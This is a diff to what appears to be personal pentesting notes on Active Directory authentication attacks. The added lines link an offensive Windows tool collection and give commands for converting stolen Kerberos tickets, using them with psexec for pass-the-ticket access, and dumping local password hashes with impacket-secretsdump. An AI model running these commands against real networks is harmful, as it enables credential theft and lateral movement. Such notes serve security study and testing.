@@ -1,4 +1,5 @@
 # AD AuthN Basic
+- window fucking 全家桶: https://github.com/Flangvik/SharpCollection 
 - Domain Expansion: I'd Win <img src="905673665fe7248681682d11b5739501.png" width="50">
 ## AuthN Type
 1. NTLM 
@@ -120,10 +121,13 @@
 - decode the kirbi with base 64 ``` cat {ticket.kirbi} | base64 -d > {ticket.kirbi} ```
 
 # Convert kirbi to ccache
-- ``` kirbi2ccache {xx.kirbi} {xx.ccache} ```
+- For linux use
+  - ``` kirbi2ccache {xx.kirbi} {xx.ccache} ```
+  - ``` impacket-ticketConverter {xx.kirbi} {xx.ccache} ```
+- Set ticket at the begining of the command in linux
+  - ``` KRB5CCNAME=ticket.ccache psexec -k -no-pass {domain}/{username}@{dc-domain-ip} ```
 
 # Attacking with SAM (security database manager)
 - usually can be found in old windows
   1. dump them to kali (including sam & system)
   2. impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
-  
